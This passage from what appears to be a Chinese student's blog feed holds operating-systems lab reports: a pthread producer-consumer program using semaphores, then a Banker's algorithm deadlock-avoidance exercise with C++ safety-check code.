class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N_WORKTIME = <span class="hljs-number">10</span>; <span class="hljs-comment">//工作次数</span><br><span class="hljs-comment">//三个信号量</span><br><span class="hljs-keyword">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER; <span class="hljs-comment">//线程间互斥</span><br><span class="hljs-keyword">sem_t</span> full;                                        <span class="hljs-comment">//填充的个数</span><br><span class="hljs-keyword">sem_t</span> empty;                                       <span class="hljs-comment">//空槽的个数</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> out;<br>    <span class="hljs-keyword">int</span> in;<br>    <span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br>    <span class="hljs-keyword">int</span> num; <span class="hljs-comment">//缓冲区里字母数量</span><br>    <span class="hljs-keyword">int</span> is_empty;<br>&#125; buffer; <span class="hljs-comment">//缓冲区结构体</span><br><span class="hljs-comment">//struct my_buffer *buffer;</span><br><span class="hljs-comment">//得到3以内的一个随机数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get_random</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> digit;<br>    digit = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">return</span> digit;<br>&#125;<br><br><span class="hljs-comment">//得到A～Z的一个随机字母</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">getRandChar</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> letter;<br>    letter = (<span class="hljs-keyword">char</span>)((<span class="hljs-built_in">rand</span>() % <span class="hljs-number">26</span>) + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    <span class="hljs-keyword">return</span> letter;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printTime</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印时间</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">time_t</span> now;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">timenow</span>;</span> <span class="hljs-comment">//实例化tm结构指针</span><br>    <span class="hljs-built_in">time</span>(&amp;now);<br>    timenow = <span class="hljs-built_in">localtime</span>(&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|   %02d:%02d:%02d   |  &quot;</span>, timenow-&gt;tm_hour, timenow-&gt;tm_min, timenow-&gt;tm_sec);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">produce_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//生产者进程的生产和信息打印</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br>    <span class="hljs-comment">/*生产产品*/</span><br>    <span class="hljs-keyword">char</span> c = <span class="hljs-built_in">getRandChar</span>(); <span class="hljs-comment">//随机获取字母</span><br>    buffer.str[buffer.in] = c;<br>    buffer.in = (buffer.in + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = <span class="hljs-number">0</span>; <span class="hljs-comment">//写入新产品</span><br>    buffer.num++;<br>    <span class="hljs-comment">//打印缓冲区</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//控制输出格式</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;producer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//进程id信息</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;+ %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">consume_print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *x)</span><span class="hljs-comment">//消费者进程的生消费和信息打印</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//sleep(get_random());</span><br>    <span class="hljs-built_in">printTime</span>(); <span class="hljs-comment">//程序运行时间</span><br>    <span class="hljs-comment">/*生产产品*/</span><br>    <span class="hljs-keyword">char</span> c = buffer.str[buffer.out];<br>    buffer.out = (buffer.out + <span class="hljs-number">1</span>) % MAX_BUFFER_SIZE;<br>    buffer.is_empty = (buffer.out == buffer.in); <span class="hljs-comment">//</span><br>    buffer.num--;<br>    <span class="hljs-comment">//打印缓冲区</span><br>    <span class="hljs-keyword">int</span> p = (buffer.in - <span class="hljs-number">1</span> &gt;= buffer.out) ? (buffer.in - <span class="hljs-number">1</span>) : (buffer.in - <span class="hljs-number">1</span> + MAX_BUFFER_SIZE);<br>    <span class="hljs-keyword">for</span> (p; !(buffer.is_empty) &amp;&amp; p &gt;= buffer.out; p--)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, buffer.str[p % MAX_BUFFER_SIZE]);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span> - buffer.num; j++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-string">&#x27;-&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   |   &quot;</span>);                 <span class="hljs-comment">//控制输出格式</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;consumer_%d   |    &quot;</span>, *x); <span class="hljs-comment">//进程id信息</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- %c    |\n&quot;</span>, c); <span class="hljs-comment">//进程操作</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">produce</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;empty); <span class="hljs-comment">//若空槽个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">produce_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;full);<br>    &#125;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">consume</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> *x = (<span class="hljs-keyword">int</span> *)arg;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N_WORKTIME; i++)<br>    &#123;<br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-built_in">get_random</span>());<br><br>        <span class="hljs-built_in">sem_wait</span>(&amp;full); <span class="hljs-comment">//若填充个数低于0阻塞</span><br>        <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br><br>        <span class="hljs-built_in">consume_print</span>(x);<br><br>        <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>        <span class="hljs-built_in">sem_post</span>(&amp;empty);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *)<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机化时间种子</span><br><br>    <span class="hljs-keyword">pthread_t</span> thid1;<br>    <span class="hljs-keyword">pthread_t</span> thid2;<br>    <span class="hljs-keyword">pthread_t</span> thid3;<br>    <span class="hljs-keyword">pthread_t</span> thid4;<br><br>    <span class="hljs-keyword">int</span> ret1;<br>    <span class="hljs-keyword">int</span> ret2;<br>    <span class="hljs-keyword">int</span> ret3;<br>    <span class="hljs-keyword">int</span> ret4;<br>    <span class="hljs-comment">//初始化信号量</span><br>    <span class="hljs-built_in">sem_init</span>(&amp;full, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;empty, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//线程id</span><br>    <span class="hljs-keyword">int</span> t1 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> t2 = <span class="hljs-number">2</span>;<br>    <span class="hljs-comment">//初始化缓冲区</span><br>    buffer.out = <span class="hljs-number">0</span>;<br>    buffer.in = <span class="hljs-number">0</span>;<br>    buffer.is_empty = <span class="hljs-number">1</span>;<br>    buffer.num = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------Thread Execution Table------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;|     time     |  buffer data  | current thread | operation |\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-comment">//创建线程</span><br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid1, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid2, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t1);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid3, <span class="hljs-literal">NULL</span>, produce, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-built_in">pthread_create</span>(&amp;thid4, <span class="hljs-literal">NULL</span>, consume, (<span class="hljs-keyword">void</span> *)&amp;t2);<br>    <span class="hljs-comment">//阻塞直到该线程结束</span><br>    <span class="hljs-built_in">pthread_join</span>(thid1, (<span class="hljs-keyword">void</span> **)&amp;ret1);<br>    <span class="hljs-built_in">pthread_join</span>(thid2, (<span class="hljs-keyword">void</span> **)&amp;ret2);<br>    <span class="hljs-built_in">pthread_join</span>(thid3, (<span class="hljs-keyword">void</span> **)&amp;ret3);<br>    <span class="hljs-built_in">pthread_join</span>(thid4, (<span class="hljs-keyword">void</span> **)&amp;ret4);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;线程全部执行完毕,主进程运行结束！\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-2"><a class="markdownIt-Anchor" href="#程序初值和运行结果-2"></a> 程序初值和运行结果</h4><p>线程</p><p><img src="/posts/3994810f/image-20211130090518453.png" alt="image-20211130090518453"></p><p><img src="/posts/3994810f/image-20211130090454157.png" alt="image-20211130090454157"></p><h3 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h3><p>本次实验中我学习到了如何利用共享内存通信来实现进程间的同步和互斥，开始时对shmget、shmat、shmdt、shmctl这些函数不是很了解，之后通过查阅资料了解了他们的用法，在编写代码的过程也遇到许多困难，在最后调试的时候还遇到了进程死锁的问题，后来看了半天才发现pv操作中给信号量设计的参数错误，导致每次进程结束都会被重置，这导致了死锁。但好在最后都发现了错误，顺利解决。</p><p>思考题让我们用线程实现，这比进程要容易很多，只需要申请一个全局变量就可以作为共享内存了，对于线程需要学习pthread_create 和pthread_join用法，最后大部分函数设计沿用进程的设计，成功实现！</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab5-操作系统第五次实验银行家算法</title>
    <link href="/posts/ab6ecd69/"/>
    <url>/posts/ab6ecd69/</url>
    
    <content type="html"><![CDATA[<h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ul><li>运用某种高级语言（如C或C++）模拟操作系统第五次实验银行家算法的处理过程。</li></ul><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>操作系统第五次实验银行家算法是避免死锁的代表性算法。本实验旨在加深了解有关资源申请、避免死锁、状态安全性等概念，并体会和运用避免死锁的具体实施方法。然后依照本实验，自行设计模拟程序</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><p>操作系统第五次实验银行家算法的模拟</p><ul><li><p>提示1</p><p>我们可以把操作系统看作是银行家，操作系统管理的资源相当于银行家管理的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。操作系统按照银行家制定的规则为进程分配资源。</p><p>当进程首次申请资源时，要测试该进程对资源的最大需求量，如果系统现存的资源可以满足它的最大需求量则按当前的申请量分配资源，否则就推迟分配。当进程在执行中继续申请资源时，先测试该进程已占用的资源数与本次申请的资源数之和是否超过了该进程对资源的最大需求量。若超过则拒绝分配资源，若没有超过则再测试系统现存的资源能否满足该进程尚需的最大资源量，若能满足则按当前的申请量分配资源，否则也要推迟分配。</p></li><li><p>提示2</p><p>安全状态：如果存在一个由系统中所有进程构成的安全序列P1，…，Pn，则系统处于安全状态。安全状态一定是没有死锁发生。</p><p>不安全状态:不存在一个安全序列。不安全状态一定导致死锁。</p><p>安全序列：一个进程序列{P1，…，Pn}是安全的，如果对于每一个进程Pi(1≤i≤n），它以后尚需要的资源量不超过系统当前剩余资源量与所有进程Pj (j &lt; i )当前占有资源量之和。</p></li><li><p>提示3</p><p>设request<sub>i</sub>为进程p[i]的请求向量，如果request<sub>i</sub>[j]=K，表示进程p[i]需要K个Rj资源。当系统发出请求后，系统按下述步骤开始检查：</p><ol><li><p>如果request<sub>i</sub>[j]&lt;=need[i][j],转向步骤2；否则报告出错，申请的资源已经大于它需要的最大值。</p></li><li><p>如果request<sub>i</sub>[j]&lt;=available[j],转向步骤3；否则报告出错，尚无足够的资源。</p></li><li><p>系统试探着把资源分配给p[i]，并修改下列数据结构中的值：</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>系统进行安全性算法，检查此次分配后，系统是否还处于安全状态，若安全，把资源分配给进程p[i]；否则，恢复原来的资源分配状态，让进程p[i]等待。</p></li></ol></li><li><p>提示4</p><p>安全性算法：<br>int work[RESOURCE_NUMBER]；<br>bool finish[PROCESS_NUMBER]；</p><ol><li>Work=Available;<br>Finish=false;</li><li>寻找满足条件的i：<br>A、Finish[i]=false;<br>B、Need[i]≤Work;<br>如果不存在，则转4)</li><li>Work:=Work+Allocation[i]； Finish[i]:=true；转2</li><li>若对所有i,Finish[i]=true,则系统处于安全状态，<br>否则处于不安全状态</li></ol></li><li><p>提示5</p><p>(操作系统第五次实验银行家算法的程序流程图)</p><p><img src="/posts/ab6ecd69/image-20211128102425394.png" alt="image-20211128102425394"></p><p><strong>思考题</strong></p></li></ul><p>设计本实验时，就尽可能的将设计人性化和考虑全面。如：能不断地进行资源分配;能修改资源的初始状态;提示信息就能充分反映算法过程等。</p><h2 id="四-实验设计与过程"><a class="markdownIt-Anchor" href="#四-实验设计与过程"></a> 四、实验设计与过程</h2><h4 id="数据结构和符号说明"><a class="markdownIt-Anchor" href="#数据结构和符号说明"></a> 数据结构和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> Available[M],     <span class="hljs-comment">//每种资源现有的实例数量</span><br>    Max[N][M],        <span class="hljs-comment">//每个进程i的对资源j最大需求</span><br>    Allocation[N][M], <span class="hljs-comment">//每个进程现在所分配的每个资源的实例数量</span><br>    Need[N][M],       <span class="hljs-comment">//每个进程还需要的剩余的资源</span><br>    Request[N][M],    <span class="hljs-comment">//进程资源请求</span><br>    sign[N],          <span class="hljs-comment">//记录安全序列</span><br>    process_num,      <span class="hljs-comment">//进程数量</span><br>    recourse_num;     <span class="hljs-comment">//资源数量</span><br></code></pre></div></td></tr></table></figure><h4 id="函数说明"><a class="markdownIt-Anchor" href="#函数说明"></a> 函数说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-comment">//初始化进程资源状况</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//打印进程资源表</span></span><br></code></pre></div></td></tr></table></figure><h5 id="安全性检查算法"><a class="markdownIt-Anchor" href="#安全性检查算法"></a> <strong>安全性检查算法</strong></h5><p>算法思路</p><ol><li>初始化Work=Available; Finish=false;</li><li>寻找满足条件的i： A、Finish[i]=false; B、Need[i]≤Work; 如果不存在，则转4)</li><li>Work:=Work+Allocation[i]； Finish[i]:=true；同时记录安全序列；转2</li><li>若对所有i,Finish[i]=true,则系统处于安全状态， 否则处于不安全状态</li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">security_test</span><span class="hljs-params">()</span> <span class="hljs-comment">//安全性检查</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> work[recourse_num];<br>    <span class="hljs-keyword">bool</span> finish[process_num];<br>    <span class="hljs-keyword">int</span> count, k = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; recourse_num; i++) <span class="hljs-comment">//初始化work</span><br>    &#123;<br>        work[i] = Available[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">//设置false</span><br>    &#123;<br>        finish[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++) <span class="hljs-comment">////满足条件释放资源，并从头开始扫描进程集合</span><br>    &#123;<br>        count = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>            <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i][j] &lt;= work[j])<br>                count++;<br>        <span class="hljs-keyword">if</span> (count == recourse_num) <span class="hljs-comment">//当进程各类资源都满足NEED&lt;=WORK时</span><br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>                work[j] = work[j] + Allocation[i][j]; <span class="hljs-comment">//释放进程</span><br>            finish[i] = <span class="hljs-literal">true</span>;<br>            sign[k] = i; <span class="hljs-comment">//记录下满足条件的进程</span><br>            k++;<br>            i = <span class="hljs-number">-1</span>; <span class="hljs-comment">//从头开始扫描</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num; i++)<br>        <span class="hljs-keyword">if</span> (finish[i] == <span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="操作系统第五次实验银行家算法"><a class="markdownIt-Anchor" href="#操作系统第五次实验银行家算法"></a> 操作系统第五次实验银行家算法</h5><p>算法思路：</p><ol><li><p>首先进行特殊情况判断</p><ul><li>资源不足和申请资源超过最大请求</li></ul></li><li><p>然后尝试进行资源分配</p><p>available[j]=available[j]request[j]<br>allocation[i][j]=allocation[i][j]+request[j]<br>need[i][j]=need[i][j]-request[j]</p></li><li><p>系统进行安全性算法，检查此次分配后，系统是否还处于安全状态，若安全，把资源分配给进程p[i]；否则，恢复原来的资源分配状态，让进程p[i]等待。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Banker_Algorithm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">//操作系统第五次实验银行家算法</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//首先进行特殊情况判断</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; recourse_num; m++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (Request[i][m] &gt; Need[i][m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;所需资源数超出其宣布的最大值!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Request[i][m] &gt; Available[m])<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;无足够资源，p[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]需等待!&quot;</span> &lt;&lt; endl;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//尝试为进程分配资源</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<br>    &#123;<br>        Available[j] = Available[j] - Request[i][j];<br>        Allocation[i][j] = Allocation[i][j] + Request[i][j];<br>        Need[i][j] = Need[i][j] - Request[i][j];<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;尝试进行资源分配后的进程资源表: &quot;</span> &lt;&lt; endl;<br>    <span class="hljs-built_in">print_information</span>();<br>    <span class="hljs-comment">//执行安全性算法</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;正在进行安全性检查&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">security_test</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;经安全性检查，系统安全，本次分配成功&quot;</span> &lt;&lt; endl;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全进程序列为：&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; process_num - <span class="hljs-number">1</span>; i++)<br>        &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[i] &lt;&lt; <span class="hljs-string">&quot;]---&gt;&quot;</span>;<span class="hljs-comment">//输出安全的进程序列</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-string">&quot;P[&quot;</span> &lt;&lt; sign[process_num - <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-string">&quot;]&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;安全性检测失败!系统不安全!!!正在恢复资源分配------&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; recourse_num; j++)<span class="hljs-comment">//恢复进程资源分配</span><br>        &#123;<br>            Available[j] = Available[j] + Request[i][j];<br>            Allocation[i][j] = Allocation[i][j] - Request[i][j];<br>            Need[i][j] = Need[i][j] + Request[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="完整源代码"><a class="markdownIt-Anchor" 